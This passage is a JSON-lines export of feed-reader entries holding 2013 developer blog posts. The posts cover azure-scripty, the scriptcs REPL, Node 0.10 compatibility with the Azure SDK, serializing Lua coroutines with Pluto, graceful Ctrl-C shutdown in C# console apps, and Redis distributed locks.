class=\"o\">:</span> <span class=\"s1\">'mobile create'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC5\">    <span class=\"nx\">positional</span><span class=\"o\">:</span> <span class=\"p\">[</span><span class=\"s1\">'mymobileservice'</span><span class=\"p\">,</span> <span class=\"s1\">'sqladmin'</span><span class=\"p\">,</span> <span class=\"s1\">'myP@ssw0rd!'</span><span class=\"p\">],</span></div><div class=\"line\" id=\"file-gistfile1-js-LC6\">    <span class=\"nx\">sqlServer</span><span class=\"o\">:</span> <span class=\"s1\">'VMF1ASD'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC7\">    <span class=\"nx\">sqlDb</span><span class=\"o\">:</span> <span class=\"s1\">'mydb'</span></div><div class=\"line\" id=\"file-gistfile1-js-LC8\">  <span class=\"p\">},</span></div><div class=\"line\" id=\"file-gistfile1-js-LC9\">  <span class=\"p\">{</span></div><div class=\"line\" id=\"file-gistfile1-js-LC10\">    <span class=\"nx\">command</span><span class=\"o\">:</span> <span class=\"s1\">'site create'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC11\">    <span class=\"nx\">positional</span><span class=\"o\">:</span> <span class=\"p\">[</span><span class=\"s1\">'site1'</span><span class=\"p\">],</span></div><div class=\"line\" id=\"file-gistfile1-js-LC12\">    <span class=\"nx\">location</span><span class=\"o\">:</span> <span class=\"s1\">'\"West US\"'</span><span class=\"p\">,</span></div><div class=\"line\" id=\"file-gistfile1-js-LC13\">    <span class=\"nx\">subscription</span><span class=\"o\">:</span> <span class=\"s1\">'foobar'</span></div><div class=\"line\" id=\"file-gistfile1-js-LC14\">    <span class=\"nx\">git</span><span class=\"o\">:</span><span class=\"kc\">true</span></div><div class=\"line\" id=\"file-gistfile1-js-LC15\">  <span class=\"p\">}</span></div><div class=\"line\" id=\"file-gistfile1-js-LC16\"><span class=\"p\">]</span></div><div class=\"line\" id=\"file-gistfile1-js-LC17\"> </div><div class=\"line\" id=\"file-gistfile1-js-LC18\"><span class=\"nx\">scripty</span><span class=\"p\">.</span><span class=\"nx\">invoke</span><span class=\"p\">(</span><span class=\"nx\">cmds</span><span class=\"p\">,</span> <span class=\"kd\">function</span><span class=\"p\">()</span> <span class=\"p\">{});</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5282679/raw/2bfd139d146f912fb7f97b278db8e3e39408efc3/gistfile1.js\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5282679#file-gistfile1-js\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.js</a><a href=\"https://gist.github.com/glennblock/5282679\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>This sample shows creating a web site and a mobile service using the object oriented style.</p><h2>Piping</h2><script src=\"http://gist.github.com/5282689.js\"></script><noscript><link rel=\"stylesheet\" href=\"https://gist.github.com/assets/embed-bfcadee384027982121fdeb9930e78b2.css\"><div id=\"gist5282689\" class=\"gist\"><div class=\"gist-file\"><div class=\"gist-data gist-syntax\"><div class=\"file-data\"><table cellpadding=\"0\" cellspacing=\"0\" class=\"lines highlight\"><tr><td class=\"line-numbers\"><span class=\"line-number\" id=\"file-gistfile1-js-L1\" rel=\"file-gistfile1-js-L1\">1</span><span class=\"line-number\" id=\"file-gistfile1-js-L2\" rel=\"file-gistfile1-js-L2\">2</span></td><td class=\"line-data\"><pre class=\"line-pre\"><div class=\"line\" id=\"file-gistfile1-js-LC1\"><span class=\"kd\">var</span> <span class=\"nx\">scripty</span> <span class=\"o\">=</span> <span class=\"nx\">require</span><span class=\"p\">(</span><span class=\"s1\">'azure-scripty'</span><span class=\"p\">);</span></div><div class=\"line\" id=\"file-gistfile1-js-LC2\"><span class=\"nx\">scripty</span><span class=\"p\">.</span><span class=\"nx\">invoke</span><span class=\"p\">([</span><span class=\"s1\">'site list'</span><span class=\"p\">,</span> <span class=\"s1\">'site stop :Name'</span><span class=\"p\">],</span> <span class=\"kd\">function</span><span class=\"p\">(){});</span></div></pre></td></tr></table></div></div><div class=\"gist-meta\"><a href=\"https://gist.github.com/glennblock/5282689/raw/80a8e0395659a74ce4659b82938e09afc3267c77/gistfile1.js\" style=\"float:right\">view raw</a><a href=\"https://gist.github.com/glennblock/5282689#file-gistfile1-js\" style=\"float:right; margin-right:10px; color:#666;\">gistfile1.js</a><a href=\"https://gist.github.com/glennblock/5282689\">This Gist</a> brought to you by <a href=\"https://github.com\">GitHub</a>.</div></div></div></noscript><p>One of my favorites. This example shows using piping to pipe the list of sites into the stop command. Notice that :Name, that’s plugging in the Name parameter from the returned site.</p><h2></h2><h2>Get it and please give feedback</h2><h2></h2><ol><li>npm install azure-scripty<li>go check the <a href=\"https://github.com/glennblock/azure-scripty/blob/master/README.md\">README</a>.<li>Start scripting! </li></ol><p>Looking forward to your feedback and your contributions!</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/DKan_BACt3U\" height=\"1\" width=\"1\"/>","author":"Glenn Block","_id":{"$wrap":"$oid","v":996}}
{"k":"0000000082","o":"0000003187","v":"001"}
{"_id":997,"_uid":997,"_dt":1373741607081,"_s":"e4689d69532f2c34bbef2145690d9f20"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/ZWUD8pHnF4g/","title":"scriptcs gets a REPL!","published":{"$wrap":"$date","v":1367950504000,"h":"2013-05-07T18:15:04.000Z"},"starred":false,"read":false,"content":"<p>Hello c# scripters!</p><p><span style=\"text-decoration: underline\">Before you go further</span>, if you are wondering what all the scriptcs hype is about please check out Scott Hanselman’s great <a href=\"http://www.hanselman.com/blog/ProjectlessScriptedCWithScriptCSAndRoslyn.aspx\">post</a> and his new Tekpub <a href=\"http://tekpub.com/shows/the_source/6\">video</a>.</p><p>Last few days I’ve been working on a new <a href=\"http://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop\">REPL</a> experience for scriptcs and now it’s in! REPLs are nothing new to dynamic languages but they have not really been available in C# with one exception, Mono has a great REPL. Roslyn introduces the Roslyn interactive window in VS which is also a REPL which runs in the editor.</p><p>This REPL is different than both in that it is specific for scriptcs, and like the rest of the scriptcs experience, there’ s no IDE required. Basically it combines the goodness of scriptcs (nuget) with an interactive experience. You can just install some nuget packages and type code which instantly executes. For example imagine just pulling in HttpClient and then just doing some http requests!</p><p>Below you can see I am installing the mongo nuget package. Then running scriptcs by itself and typing in some simple code to work with the package.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/05/clip_image001.jpg\"><img style=\"border: 0px\" title=\"clip_image001\" alt=\"clip_image001\" src=\"http://codebetter.com/glennblock/files/2013/05/clip_image001_thumb.jpg\" width=\"534\" height=\"570\" border=\"0\" /></a></p><p>And then we have pretty error handling.</p><p><a href=\"http://codebetter.com/glennblock/files/2013/05/clip_image002.jpg\"><img style=\"border: 0px\" title=\"clip_image002\" alt=\"clip_image002\" src=\"http://codebetter.com/glennblock/files/2013/05/clip_image002_thumb.jpg\" width=\"554\" height=\"285\" border=\"0\" /></a></p><p>Thanks to the Roslyn team’s efforts layering a REPL on top was AMAZINGLY easy. The REPL part itself was like 15 lines of code! And thanks to the nuget team for even making this a remote possibility through having an awesome package ecosystem. I look forward to ALSO seeing the mono version soon <img src='http://codebetter.com/glennblock/wp-includes/images/smilies/icon_smile.gif' alt=':-)' class='wp-smiley' /> </p><p>If you wanna try it, you can grab the latest from github at <a href=\"http://github.com/scriptcs/scriptcs\">http://github.com/scriptcs/scriptcs</a> in the dev branch.</p><p>It will also be on our chocolately nightly builds tomorrow: <a href=\"http://www.myget.org/F/scriptcsnightly\">http://www.myget.org/F/scriptcsnightly</a>. It should be on our public feed very soon there after.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/ZWUD8pHnF4g\" height=\"1\" width=\"1\"/>","author":"Glenn Block","_id":{"$wrap":"$oid","v":997}}
{"k":"0000000082","o":"0000002189","v":"001"}
{"_id":998,"_uid":998,"_dt":1373741607082,"_s":"d96aca9d1237a7e6b39acd809089ed09"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/pvH5YBcpG9U/brighton-alt-net-brighton-digital.html","title":"Brighton ALT NET @ Brighton Digital Festival","published":{"$wrap":"$date","v":1373382120000,"h":"2013-07-09T15:02:00.000Z"},"starred":false,"read":false,"content":"<p> </p><p><a href=\"http://lh3.ggpht.com/-fmckfxicvFM/Udwl9_sv0ZI/AAAAAAAAKMU/F4_VUl4cEhg/s1600-h/BDF_logo_date_flame_cmyk%25255B4%25255D.png\"><img title=\"BDF_logo_date_flame_cmyk\" style=\"border-top: 0px; border-right: 0px; border-bottom: 0px; border-left: 0px; display: inline\" border=\"0\" alt=\"BDF_logo_date_flame_cmyk\" src=\"http://lh6.ggpht.com/-wkFmp_I3trQ/Udwl-SyIytI/AAAAAAAAKMc/oPr2k7CUcQs/BDF_logo_date_flame_cmyk_thumb%25255B2%25255D.png?imgmax=800\" width=\"640\" height=\"209\" /></a></p><p> </p><p>TL;DR We need you! Present your project at our BDF special event in September.</p><p><a href=\"http://www.brightondigitalfestival.co.uk/\">Brighton Digital Festival</a>is a month long celebration of all things digital throughout September in the lovely city of Brighton. There’s absolutely loads going on, and one would need to take the whole month off work to see everything. Last year was a blast, and this year looks to be even better, with full time festival organisers and funding from the arts council.</p><p><a href=\"http://brightonalt.net/\">Brighton ALT NET</a>is a monthly meet-up for .NET developers. We’ve been going for several years now. Each month we meet up, drink beer, and geek out about the .NET framework and software development in general. For our September event we thought it would be excellent fun to join in with the Digital Festival and do something special. We want to showcase some of the brilliant things developers like you are doing in the local area; a show-and-tell of awesome if you will. If you’ve got a project you’d like to show off, something you’ve done at work, or in your spare time, get in touch with me. It can be anything from a Netduino mouse-trap to online community of traffic cone spotters.</p><p>Email me at mike-at-suteki.co.uk.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":998}}
{"k":"0000000082","o":"0000001603","v":"001"}
{"_id":999,"_uid":999,"_dt":1373741607082,"_s":"f4407f0804d6ad84205d5d827d3d6643"}
{"subscription":{"$wrap":"$oid","v":15},"link":"http://feedproxy.google.com/~r/CodeBetter/~3/iIRw1t8xZuc/","title":"Node 0.10.x compat issues with the Azure SDK and CLI","published":{"$wrap":"$date","v":1363571763000,"h":"2013-03-18T01:56:03.000Z"},"starred":false,"read":false,"content":"<p>Recently the node blog <a href=\"http://blog.nodejs.org/2013/03/11/node-v0-10-0-stable/\">announced</a> that node 0.10 has shipped. This release includes a bunch of exciting improvements to node core around several areas including streams, domains and performance.</p><p>As soon as it shipped we started to get reports of issues using our SDK and CLI. We’ve investigated this and uncovered that there are some things we need to fix. In the meanwhile, node 0.10.x is not currently supported. We’d ask everyone using our SDK and CLI to stick to node 0.8.x for the time being.</p><p>If you are using our <a href=\"https://github.com/downloads/WindowsAzure/azure-sdk-downloads/azuresdk-v0.6.9.pkg\">Mac</a> or <a href=\"http://go.microsoft.com/fwlink/?LinkID=275464&clcid=0x409\">Windows</a> installers you should be fine as they each include private copies of node with working versions.</p><p>We are on top of this and will be working on this in our next sprint. We’ll keep you posted and let you know as soon as we have it working which we expect to be very soon.</p><p>Thanks for your understanding and sorry for any inconvenience this has caused.</p><img src=\"http://feeds.feedburner.com/~r/CodeBetter/~4/iIRw1t8xZuc\" height=\"1\" width=\"1\"/>","author":"Glenn Block","_id":{"$wrap":"$oid","v":999}}
{"k":"0000000084","o":"0000009861","v":"001"}
{"_id":1000,"_uid":1000,"_dt":1373741607082,"_s":"f580f4d570034672a3b9ba778dcf26ad"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/jwMF2Q_1M7c/serializing-lua-coroutines-with-pluto.html","title":"Serializing Lua Coroutines With Pluto","published":{"$wrap":"$date","v":1366297860000,"h":"2013-04-18T15:11:00.000Z"},"starred":false,"read":false,"content":"<p>In my last post I showed how it’s possible to use Lua as a<a href=\"http://mikehadlow.blogspot.co.uk/2013/04/lua-as-distributed-workflow-scripting.html\">distributed workflow scripting language</a>because of its build in support for coroutines. But in order to create viable long-running workflows we have to have some way of saving the script’s state at the point that it pauses; we need a way to serialize the coroutine.</p><p>Enter Pluto:</p><blockquote><p>“<em>Pluto is a heavy duty persistence library for Lua. Pluto is a library which allows users to write arbitrarily large portions of the\"Lua universe\" into a flat file, and later read them back into the same or a different Lua universe.</em>”</p></blockquote><p>I downloaded the<a href=\"http://luaos.net/pages/tamed-pluto.php\">Win32 build of Tamed Pluto from here</a>and placed it in a directory alongside my Pluto.dll. You have to tell Lua where to find C libraries by setting the Lua package.cpath:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">using</span>(var lua =<span style=\"color: #0000ff\">new</span>Lua())<br />{<br />lua[<span style=\"color: #006080\">\"package.cpath\"</span>] =<span style=\"color: #006080\">@\"D:\\Source\\Mike.DistributedLua\\Lua\\?.dll\"</span>;<br /><br />...<br />}<br /></pre><br /></div><p>Lua can now find the Pluto library and we can import it into our script with:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">require(<span style=\"color: #006080\">'pluto'</span>)</pre><br /></div><p></p><p>Here’s a script which defines a function foo which calls a function bar. Foo is used to create a coroutine. Inside bar the coroutine yields. The script uses Pluto to serialize the yielded coroutine and saves it to a file.</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #008000\">-- import pluto, print out the version number</span><br /><span style=\"color: #008000\">-- and set non-human binary serialization scheme.</span><br />require(<span style=\"color: #006080\">'pluto'</span>)<br /><span style=\"color: #0000ff\">print</span>(<span style=\"color: #006080\">'pluto version '</span>..pluto.version())<br />pluto.human(<span style=\"color: #0000ff\">false</span>)<br /><br /><span style=\"color: #008000\">-- perms are items to be substituted at serialization</span><br />perms = { [coroutine.yield] = 1 }<br /><br /><span style=\"color: #008000\">-- the functions that we want to execute as a coroutine</span><br /><span style=\"color: #0000ff\">function</span>foo()<br /><span style=\"color: #0000ff\">local</span>someMessage =<span style=\"color: #006080\">'And hello from a long dead variable!'</span><br /><span style=\"color: #0000ff\">local</span>i = 4<br />bar(someMessage)<br /><span style=\"color: #0000ff\">print</span>(i)<br /><span style=\"color: #0000ff\">end</span><br /><br /><span style=\"color: #0000ff\">function</span>bar(msg)<br /><span style=\"color: #0000ff\">print</span>(<span style=\"color: #006080\">'entered bar'</span>)<br /><span style=\"color: #008000\">-- bar runs to here then yields</span><br />coroutine.yield()<br /><span style=\"color: #0000ff\">print</span>(msg)<br /><span style=\"color: #0000ff\">end</span><br /><br /><span style=\"color: #008000\">-- create and start the coroutine</span><br />co = coroutine.<span style=\"color: #0000ff\">create</span>(foo)<br />coroutine.resume(co)<br /><br /><span style=\"color: #008000\">-- the coroutine has now stopped at yield. so we can</span><br /><span style=\"color: #008000\">-- persist its state with pluto</span><br />buf = pluto.persist(perms, co)<br /><br /><span style=\"color: #008000\">-- save the serialized state to a file</span><br />outfile = io.<span style=\"color: #0000ff\">open</span>(persistCRPath,<span style=\"color: #006080\">'wb'</span>)<br />outfile:<span style=\"color: #0000ff\">write</span>(buf)<br />outfile:<span style=\"color: #0000ff\">close</span>()</pre><br /></div><p>This next script loads the serialized coroutine from disk, deserializes it, and runs it from the point that it yielded:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #008000\">-- import pluto, print out the version number</span><br /><span style=\"color: #008000\">-- and set non-human binary serialization scheme.</span><br />require(<span style=\"color: #006080\">'pluto'</span>)<br /><span style=\"color: #0000ff\">print</span>(<span style=\"color: #006080\">'pluto version '</span>..pluto.version())<br />pluto.human(<span style=\"color: #0000ff\">false</span>)<br /><br /><span style=\"color: #008000\">-- perms are items to be substituted at serialization</span><br /><span style=\"color: #008000\">-- (reverse the key/value pair that you used to serialize)</span><br />perms = { [1] = coroutine.yield }<br /><br /><span style=\"color: #008000\">-- get the serialized coroutine from disk</span><br />infile, err = io.<span style=\"color: #0000ff\">open</span>(persistCRPath,<span style=\"color: #006080\">'rb'</span>)<br /><span style=\"color: #0000ff\">if</span>infile == nil<span style=\"color: #0000ff\">then</span><br />error(<span style=\"color: #006080\">'While opening: '</span>.. (err<span style=\"color: #0000ff\">or</span><span style=\"color: #006080\">'no error'</span>))<br /><span style=\"color: #0000ff\">end</span><br /><br />buf, err = infile:<span style=\"color: #0000ff\">read</span>(<span style=\"color: #006080\">'*a'</span>)<br /><span style=\"color: #0000ff\">if</span>buf == nil<span style=\"color: #0000ff\">then</span><br />error(<span style=\"color: #006080\">'While reading: '</span>.. (err<span style=\"color: #0000ff\">or</span><span style=\"color: #006080\">'no error'</span>))<br /><span style=\"color: #0000ff\">end</span><br /><br />infile:<span style=\"color: #0000ff\">close</span>()<br /><br /><span style=\"color: #008000\">-- deserialize it</span><br />co = pluto.unpersist(perms, buf)<br /><br /><span style=\"color: #008000\">-- and run it</span><br />coroutine.resume(co)</pre><br /></div><p>When we run the scripts, the first prints out ‘entered bar’ and then yields:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">LUA&gt; pluto version Tamed Pluto 1.0<br />LUA&gt; entered bar</pre><br /></div><p>The second script loads the paused ‘foo’ and ‘bar’ and continues from the yield:</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">LUA&gt; pluto version Tamed Pluto 1.0<br />LUA&gt; And hello from a<span style=\"color: #0000ff\">long</span>dead variable!<br />LUA&gt; 4</pre><br /></div><p>Having the ability to run a script to the point at which it starts a long running call, serialize its state and store it somewhere, then pick up that serialized state and resume it at another place and time is a very powerful capability. It means we can write simple procedural scripts for our workflows, but have them execute over a distributed service oriented architecture.</p><p>The complete code for this experiment is on GitHub<a href=\"https://github.com/mikehadlow/Mike.DistributedLua/blob/master/Mike.DistributedLua/PlutoSpike.cs\">here</a>.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1000}}
{"k":"0000000084","o":"0000004407","v":"001"}
{"_id":1001,"_uid":1001,"_dt":1373741607083,"_s":"bd1a393d528d7659226c63eb44fd1086"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/vHytyO36rf4/stop-your-console-app-nice-way.html","title":"Stop Your Console App The Nice Way","published":{"$wrap":"$date","v":1366645080000,"h":"2013-04-22T15:38:00.000Z"},"starred":false,"read":false,"content":"<p>When you write a console application, do you simply put</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\">Console.WriteLine(<span style=\"color: #006080\">\"Hit&lt;enter&gt; to end\"</span>);<br />Console.ReadLine();</pre></div><p>at the end of Main and block on Console.ReadLine()?</p><p>It’s much nicer to to make your console application work with Windows command line conventions and exit when the user types Control-C.</p><p>The Console class has a static event CancelKeyPress that fires when Ctrl-C is pressed. You can create an AutoResetEvent that blocks until you call Set in the CancelKeyPress handler.</p><p>It’s also nice to stop the application from being arbitrarily killed at the point where Ctrl-C is pressed by setting the EventArgs.Cancel property to true. This gives you a chance to complete what you are doing and exit the application cleanly.</p><p>Here’s an example. My little console application kicks off a worker thread and then blocks waiting for Ctrl-C as described above. When Ctrl-C is pressed I send a signal to the worker thread telling it to finish what it’s doing and exit.</p><div id=\"codeSnippetWrapper\"><pre id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span style=\"color: #0000ff\">using</span>System;<br /><span style=\"color: #0000ff\">using</span>System.Threading;<br /><br /><span style=\"color: #0000ff\">namespace</span>Mike.Spikes.ConsoleShutdown<br />{<br /><span style=\"color: #0000ff\">class</span>Program<br />{<br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">bool</span>cancel =<span style=\"color: #0000ff\">false</span>;<br /><br /><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">void</span>Main(<span style=\"color: #0000ff\">string</span>[] args)<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"Application has started. Ctrl-C to end\"</span>);<br /><br /><span style=\"color: #008000\">// do some cool stuff here</span><br />var myThread =<span style=\"color: #0000ff\">new</span>Thread(Worker);<br />myThread.Start();<br /><br />var autoResetEvent =<span style=\"color: #0000ff\">new</span>AutoResetEvent(<span style=\"color: #0000ff\">false</span>);<br />Console.CancelKeyPress += (sender, eventArgs) =&gt;<br />{<br /><span style=\"color: #008000\">// cancel the cancellation to allow the program to shutdown cleanly</span><br />eventArgs.Cancel =<span style=\"color: #0000ff\">true</span>;<br />autoResetEvent.Set();<br />};<br /><br /><span style=\"color: #008000\">// main blocks here waiting for ctrl-C</span><br />autoResetEvent.WaitOne();<br />cancel =<span style=\"color: #0000ff\">true</span>;<br />Console.WriteLine(<span style=\"color: #006080\">\"Now shutting down\"</span>);<br />}<br /><br /><span style=\"color: #0000ff\">private</span><span style=\"color: #0000ff\">static</span><span style=\"color: #0000ff\">void</span>Worker()<br />{<br /><span style=\"color: #0000ff\">while</span>(!cancel)<br />{<br />Console.WriteLine(<span style=\"color: #006080\">\"Worker is working\"</span>);<br />Thread.Sleep(1000);<br />}<br />Console.WriteLine(<span style=\"color: #006080\">\"Worker thread ending\"</span>);<br />}<br />}<br />}<br /></pre><br /></div><p>Much nicer I think.</p>","author":"Mike Hadlow","_id":{"$wrap":"$oid","v":1001}}
{"k":"0000000084","o":"0000014263","v":"001"}
{"_id":1002,"_uid":1002,"_dt":1373741607083,"_s":"f2557a2431a9e0c28d6098d2d627eaa2"}
{"subscription":{"$wrap":"$oid","v":14},"link":"http://feedproxy.google.com/~r/CodeRant/~3/55ZH5cxWQ-E/redis-very-useful-as-distributed-lock.html","title":"Redis: Very Useful As a Distributed Lock","published":{"$wrap":"$date","v":1371551640000,"h":"2013-06-18T10:34:00.000Z"},"starred":false,"read":false,"content":"<p>In a Service Oriented Architecture you sometimes need a distributed lock; an application lock across many servers to serialize access to some constrained resource. I’ve been looking at using<a href=\"http://redis.io/\">Redis</a>, via the excellent<a href=\"https://github.com/ServiceStack/ServiceStack.Redis\">ServiceStack.Redis</a>client library, for this.</p><p>It really is super simple. Here’s a little F# sample to show it in action:</p><div id=\"codeSnippetWrapper\"><div id=\"codeSnippet\" style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum1\" style=\"color: #606060\">1:</span>module Zorrillo.Runtime.ProxyAutomation.Tests.RedisSpike</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum2\" style=\"color: #606060\">2:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum3\" style=\"color: #606060\">3:</span>open System</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum4\" style=\"color: #606060\">4:</span>open ServiceStack.Redis</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum5\" style=\"color: #606060\">5:</span> </pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum6\" style=\"color: #606060\">6:</span>let iTakeALock n =</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum7\" style=\"color: #606060\">7:</span>async {</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum8\" style=\"color: #606060\">8:</span>use redis =<span style=\"color: #0000ff\">new</span>RedisClient(<span style=\"color: #006080\">\"redis.local\"</span>)</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum9\" style=\"color: #606060\">9:</span>let<span style=\"color: #0000ff\">lock</span>= redis.AcquireLock(<span style=\"color: #006080\">\"integration_test_lock\"</span>, TimeSpan.FromSeconds(10.0))</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; border-right-style: none; padding-left: 0px; margin: 0em; line-height: 12pt; padding-right: 0px; width: 100%; background-color: #f4f4f4\"><span id=\"lnum10\" style=\"color: #606060\">10:</span>printfn<span style=\"color: #006080\">\"Aquired lock for %i\"</span>n</pre><!--CRLF--><pre style=\"border-top-style: none; overflow: visible; font-size: 8pt; border-left-style: none; font-family:'Courier New', courier, monospace; border-bottom-style: none; color: black; padding-bottom: 0px; direction: ltr; text-align: left; padding-top: 0px; 